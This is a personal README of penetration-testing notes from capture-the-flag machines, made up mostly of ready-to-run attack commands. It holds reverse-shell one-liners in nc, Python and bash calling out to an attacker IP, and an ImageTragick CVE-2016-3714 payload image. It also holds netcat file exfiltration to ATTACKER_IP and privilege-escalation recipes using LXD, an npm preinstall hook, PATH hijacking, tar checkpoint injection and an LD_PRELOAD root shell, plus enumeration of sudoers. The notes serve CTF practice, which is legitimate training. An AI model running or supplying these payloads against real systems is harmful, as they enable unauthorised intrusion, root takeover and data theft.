# HackNotes

This repository contains my personal notes and tricks that I've gathered while working on various machines in the TryHackMe and HackTheBxo platforms. These notes serve as a guide for penetration testing and help me document my progress and findings.

Please note that these notes are a work in progress, and I'll be continuously adding more content as I progress through the challenges and machines.

## Introduction
In this repository, you will find a compilation of various tricks, commands, and techniques that can be useful during penetration testing activities. These notes are intended to assist in the process of hacking and securing systems.

### [notes](./other/notes.md)
### [web](./other/web.md)
### [osint](./other/osint.md)
---
#### Reverse shells
```nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
```
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
```bash
bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
```
<details><summary>CVE-2016–3714</summary>

```
cat > image.png << EOF
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```
</details>

---
#### File Transfer on `Netcat`

1. To download a file on the remote shell:
```nc
nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
```
2. To receive the file on the attacker machine:
```nc
nc -l ATTACKER_PORT > [output_file_path]
```
#### Transfer files using `scp`:
```
scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
```

---
### Linux Privilege Escalation:
<details><summary> LXD container exploitation </summary> 

```bash
wget archive
lxc image import ./archive --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true # If not working, use FINGERPRINT
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```
</details>
<details><summary> with doas </summary>

```bash
doas -u root openssl enc -in file
doas -u root /bin/bash
```
</details>
<details><summary> with npm -u </summary>

```bash
mkdir ~/tmp
echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
```
</details>

<details><summary>PATH</summary>

```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
./app_that_calls_curl
```

</details>

<details><summary>tar</summary>

```bash
cat > /home/andre/backup/rev << EOF
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
EOF
echo "" > "/home/andre/backup/--checkpoint=1"
echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
chmod +x rev
```
</details>

<details><summary>env_keep += LD_PRELOAD</summary>

```
cd /tmp
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
EOF
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```

</details>

#### information gathering
```bash
cat /proc/version
cat /etc/issue
cat /etc/sudoers
ps aux | grep cron
ps
env
ip route
uname -a
netstat # -at -l -t -tp -i
netstat -tupln | grep LISTEN
ss -atur
find / -writable 2>/dev/null
find / -mtime 10 #find files that were modified in the last 10 days
find . -name flag.txt
find / -type d -name config #find the directory named config under “/”
find / -type f -user <user> 2>/dev/null #find files owned by user
find / -type f -perm /4000 2>/dev/null
find / -type f -group <group> -exec ls -l {} + 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/exports #file sharing
nmap --script=vuln <ip>
cat /proc/1/cgroup #if u in docker
```
quik one-line bash script with colorful output to enumerate linux machine
```bash
for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/version" "cat /etc/issue" "cat /etc/sudoers" "cat /etc/sudoers.d" "env" "ip route" "uname -a" "netstat -tupln | grep LISTEN" "find / -type f -perm /4000 2>/dev/null" "getcap -r / 2>/dev/null" "cat /etc/exports" "cat /proc/1/cgroup"; do echo  "\n\033[1;34mCommand: $cmd\033[0m"; echo "\033[1;32m$(eval $cmd)\033[0m"; echo  "\033[1;33m\n===================================================================================================\n==================================================================================================="; done
```

<details><summary> links </summary>

* [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [linEnum](https://github.com/rebootuser/LinEnum)
* [LES](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [linux Priv Checker](https://github.com/linted/linuxprivchecker)
* [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
* [GTFOBins (unix)](https://gtfobins.github.io/)
* [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [linux backdoors](/other/src/linux_backdoors.md)

</details>

---

[windows](./other/windows.md)

---

### links
* [database with CVE exploits](https://cvexploits.io/)
* [explainshell.com](https://explainshell.com/)
* [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [rapid7](https://www.rapid7.com/)
* [attackerkb](https://attackerkb.com/)
* [cve.mitre.org](https://cve.mitre.org/cve/)
* [exploit-db](https://www.exploit-db.com/)
* [WTFBINS (cve)](https://wtfbins.wtf/)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
* [hacktricks](https://book.hacktricks.xyz)
* [bash cheatsheet](https://devhints.io/bash)
* [enumeration guide](https://github.com/beyondtheoryio/Enumeration-Guide)
* [tmpfiles](https://tmpfiles.org/)
* [pentest-checklist](https://github.com/Hari-prasaanth/Web-App-Pentest-Checklist)
* [awesome ctf](https://github.com/apsdehal/awesome-ctf)

####  Encoding techniques:
- [splitbrain](https://www.splitbrain.org/_static/ook/)
- [hashes](https://hashes.com/en/tools/hash_identifier)
- [md5hashing](https://md5hashing.net/hash)
- [cyberchef](https://gchq.github.io/CyberChef/)
- [free pass hash cracker](https://crackstation.net/)
- [crack station](https://crackstation.net/)
- [md5decrypt.net](https://md5decrypt.net/en/)
- [vigenere brute force](https://www.guballa.de/vigenere-solver)
- [html enteties](https://www.webatic.com/html-entities-convertor)
- [list of signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

#### Tools
* [reconftw](https://github.com/six2dez/reconftw)
* [google dorks](/HackNotes/other/src/dorks.md)
* [aquatone](https://github.com/michenriksen/aquatone/releases/tag/v1.7.0)(screenshots)
* [nuclei](https://github.com/projectdiscovery/nuclei)(scan for vulns)
* [meg](https://github.com/tomnomnom/meg)(fetch many paths for many hosts)
* [arjun](https://github.com/s0md3v/Arjun)(http param discovery)
* [dalfox](https://github.com/hahwul/dalfox)(find xxs)
* [cdncheck](https://github.com/projectdiscovery/cdncheck)(identifying the technology associated with dns)
* [xxs-encoder](http://evuln.com/tools/xss-encoder/)
* [XXSHunter](https://xsshunter.trufflesecurity.com/app/#/)


* [other links](/HackNotes/other/src/tools.md)

---
Happy hacking!
